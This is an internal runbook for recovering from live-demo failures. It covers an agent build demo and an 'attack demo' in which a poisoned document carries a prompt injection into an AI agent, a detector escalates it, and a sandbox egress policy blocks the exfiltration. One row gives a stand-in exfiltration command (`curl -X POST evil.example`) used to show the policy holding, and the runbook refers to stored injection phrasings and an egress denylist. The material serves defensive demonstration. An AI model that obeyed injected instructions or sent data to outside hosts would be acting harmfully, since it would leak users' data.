# Spec — Live-Demo Failure Runbook (on-stage recovery)

Status: **spec only, planning mode — no code until flag lifted.**
Owner: whoever drives the demo (Alex if he joins, else Adrian). Sky owns the security-demo rows.
Depends on: every money-demo spec — this is the "what if it breaks *on stage*" layer none of them carry.

> Why this exists: PLAN §Risks mitigates **setup-time** failure (NemoClaw slips,
> HL API surprises, Slack approval friction). The per-spec Test-plans prove the
> paths work **beforehand**. Neither answers "the escalation is hanging, the room
> is watching, what do I press?" Both money demos have single points of failure
> with no rehearsed live fallback. The backup screen-recording (PLAN, Sunday 9 AM)
> is the last resort, not the first. This runbook is the graceful-degradation path
> between "it works" and "roll the tape."

---

## 1. Rule zero

**One driver talks, one operator drives, the tape is cued.** The backup recording
(poisoned-doc §4, PLAN Sunday 9 AM) is loaded in a background tab BEFORE the demo
starts. Every row below has a spoken cover line so a failure looks like a planned
teaching moment, not a crash. If two fallbacks in a row fail → cut to tape without
apology and keep narrating.

---

## 2. Build demo (money demo #1) — failure rows

| Failure | Detect on stage | Fallback (in priority order) | Cover line |
|---|---|---|---|
| Apify scrape hangs / 5xx | research task stuck <50% >10s | (1) it auto-falls to labeled sample catalog — **let it**, the card says so; (2) if it errors instead of falling back → pre-run a warm goal in another tab | "The research agent sources live, but it's honest when a feed is slow — it labels its fallback rather than faking data." |
| Shopify 429 / token dead | store-builder task `failed`, `Shopify API 429` | (1) SIM mode already labels; flip `SIM_MODE=1` for a clean labeled run; (2) show the pre-created products in the dev store admin tab | "The build path is real — here's the store it populated on the last run" (switch to admin tab) |
| No niche / clarify loop stuck | CEO stuck in `clarifying` | type the niche answer directly in the dashboard thread | — (this is the intended flow; not a failure) |
| Dashboard SSE disconnects | tiles stop updating | reload `/` — snapshot re-renders full state from disk (registry/bus persisted) | "Let me refresh the live view" |
| Whole flow wedged | nothing advancing >15s | reset with memory kept: `POST /reset?keepMemory=1`, re-run the goal | "Fresh run, same learned memory" (doubles as a learning-loop setup) |

Key property to lean on: **sim is always labeled** (IMPROVEMENTS #4). A fallback to
sim is not a lie on screen — say so and it strengthens the honesty story.

---

## 3. Attack demo (money demo #2) — failure rows

This is the higher-risk demo (two integrations, live gate). Rows ordered by
likelihood.

| Failure | Detect on stage | Fallback | Cover line |
|---|---|---|---|
| HL API slow / down mid-scan | escalation card doesn't appear in ~3s | heuristic floor still fires (`detect.ts`) → escalation still raises on heuristics alone; narrate that as designed | "Even with the cloud detector unavailable, the local floor caught it — defense in depth starts before the API call." |
| Escalation **hangs** (no resolve, worker awaits forever) | agent stays `blocked`, nothing proceeds | THIS IS THE KNOWN CODE GAP — no timeout (see `code-fixes.spec.md` C6). Live workaround: click **Deny** to force-resolve, then narrate the Layer-2 block; do NOT wait | "I'll deny it — and watch: even denied-then-imagine-approved, the policy still blocks the exfil." |
| Injection phrasing doesn't flag | no detection at all | use the pre-selected highest-flag-rate phrasing (`adversarial-harness.spec.md` §3) — never improvise a string on stage; backups are in `injections.jsonl` | — (pre-selected, should not happen) |
| Sandbox not up (NemoClaw slipped) → `local` mode | red **UNCONTAINED** badge shows (worker-mode §3) | Layer 2 (OpenShell egress) is GONE in local mode — pivot to the local egress denylist courtesy-block (worker-mode §3.3) OR cut to the recorded `nemoclaw`-mode capture | "We're in break-glass mode — let me show you the contained version we captured" (roll capture) |
| Exfil `POST` never attempted (model refuses) | no `policy_denied` line | drive it manually: `curl -X POST evil.example` from inside the sandbox (poisoned-doc §6) — the point is the POLICY denies it, regardless of who sends it | "Let me send the exfil myself to show the boundary holds against anyone" |
| Heartbeat reaction doesn't fire | no autonomous CEO line after block | wait one more `HEARTBEAT_MS`; if still nothing, narrate the blocked state manually and move on — do not stall the room on the eligibility beat | "The agent's held pending my decision" |

---

## 4. Pre-demo checklist (T-10 minutes, run every time)

Fail any item → do NOT start live; use the tape.

1. `npm run adversarial -- --mode scan` green (floor detects, no crash).
2. One warm build goal completed in a spare tab (proves the full path today).
3. Dev-store admin tab open and showing products (Shopify fallback ready).
4. Backup recording tab loaded and scrubbed to start.
5. `.env` sanity: `printenv | grep -c nvapi` etc. NOT shown on screen, checked privately.
6. Dashboard reachable at the projector resolution (SSE flowing).
7. Pre-selected injection phrasing confirmed flagging against live HL once.

---

## 5. What NOT to do on stage

- **Do not edit code live.** No "quick fix" — every row above is press-a-button or
  switch-a-tab only.
- **Do not wait on a hang.** The escalation-hang row is the single most likely
  time-sink; the reflex is Deny-and-continue, not wait.
- **Do not improvise an injection string.** Threshold behavior is unpredictable
  (poisoned-doc §6); only pre-tested phrasings.
- **Do not apologize for sim.** It is labeled and honest; frame it as a feature.

---

## 6. Open items

- [ ] Fix C6 (escalation timeout) before demo so the highest-risk row becomes a
      non-issue instead of a manual Deny — see `code-fixes.spec.md`. If unfixed, the
      Deny-and-continue reflex MUST be rehearsed.
- [ ] Record the `nemoclaw`-mode attack capture (poisoned-doc §4) early enough that
      the "sandbox not up" row has a real tape to cut to.
- [ ] Assign the operator vs driver roles explicitly (PLAN §Alex-is-a-maybe).
- [ ] Rehearse each fallback row at least once — a fallback never practiced is not a
      fallback.
